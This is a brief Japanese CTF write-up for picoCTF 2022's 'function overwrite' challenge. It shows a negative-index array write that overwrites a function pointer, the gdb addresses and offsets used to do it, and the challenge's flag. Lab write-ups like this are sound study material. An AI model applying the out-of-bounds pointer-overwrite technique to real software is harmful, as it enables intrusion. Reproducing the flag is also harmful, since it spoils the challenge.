
```
gef➤  checksec
[+] checksec for '/home/pwn/challenges/picoCTF2022/function overwrite/attachment/vuln'
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

```c
void (*check)(char*, size_t) = hard_checker;
int fun[10] = {0};
```
```c
  if (num1 < 10)
  {
    fun[num1] += num2;
  }
```
`num1`は負の値を取れるため、`check`を書き換えられる。

```
gef➤  i var
(snip)
0x0804c040  check
(snip)
0x0804c080  fun
(snip)
```

`0x40`バイト差がある。`num1`は`int`で4バイトなので、`num1`は`-0x10`で良い。

```
gef➤  i func
(snip)
0x080492fc  easy_checker
0x08049436  hard_checker
(snip)
```

`num2`は`0x080492fc - 0x08049436`。

Flag: `picoCTF{0v3rwrit1ng_P01nt3rs_53614882}`